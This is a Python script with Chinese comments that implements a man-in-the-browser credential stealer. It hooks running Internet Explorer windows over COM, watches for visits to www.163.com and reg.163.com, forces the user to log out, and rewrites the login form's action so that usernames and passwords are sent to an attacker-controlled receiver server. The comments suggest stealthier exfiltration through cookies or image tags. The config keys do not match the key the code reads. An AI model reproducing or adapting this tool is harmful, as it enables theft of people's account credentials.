# -*- coding:utf8 -*-


import win32com.client
import time
import urlparse
import urllib

#   通过data_receiver变量指定接受目标网站登录凭证的Web服务器
#   缺点：如果一个谨慎的用户可能会注意到链接重定向的发生
#   解决办法：设法通过抽取用户cookie或者通过图片标签和其他DOM对象推送存储的登录凭证，这样你窃取目标网站凭证的行为将更加屏蔽.
data_receiver = "http://127.0.0.1:8080/"

#   目标站点
target_sites = {}

target_sites["www.163.com"] = {
    "logout_url": "",  # 通过GET请求强制用户重定向该链接从而退出登录
    "logout_form": None,  # logout_form是一个DOM对象，我们通过将其提交给目标网站而强制用户退出.
    "logout_form_index": 0,  # logout_form_index  是我们要修改的登录表单在目标域名网页的DOM对象中的相对位置.
    "owned": False  # owned标志位告诉我们是否已经抓取到目标网站的登录凭证.
}
target_sites["reg.163.com"] = {
    "logout_url": "",
    "logout_form": None,
    "logout_form_index": 0,
    "owned": False
}

#   IE浏览器类的ID号
clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

#   COM对象实例化
#   可以通过该对象访问IE浏览器正在运行的所有标签页和实例.
windows = win32com.client.Dispatch(clsid)


def wait_for_browser(browser):
    # 等待浏览器加载完一个页面,方便脚本代码继续执行之前，能够确定DOM对象已经完全加载.
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


while True:  # 主循环用于监控目标的浏览器会话是否在访问我们希望得到登录凭证的网站.

    for browser in windows:  # 迭代当前运行的所有IE浏览器对象(包含当前IE活动的标签页)
        url = urlparse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:  # 如果访问我们预先设定的网站
            # print "i am in"
            if target_sites[url.hostname]["owned"]:
                continue

            # 如果有一个URL，我们可以重定向
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                # 检索文件中的所有元素
                full_doc = browser.Document.all
                # 迭代寻找注销表单
                for i in full_doc:
                    try:
                        # 找到退出登陆的表单并提交
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            # 现在来修改登陆表单
            # 强制提交这个表单，当用户重新跳转到登录表单的时候，我们通过修改表单送达额后端地址，
            # 将用户名和口令提交到我们掌控的服务器上
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass
        time.sleep(5)
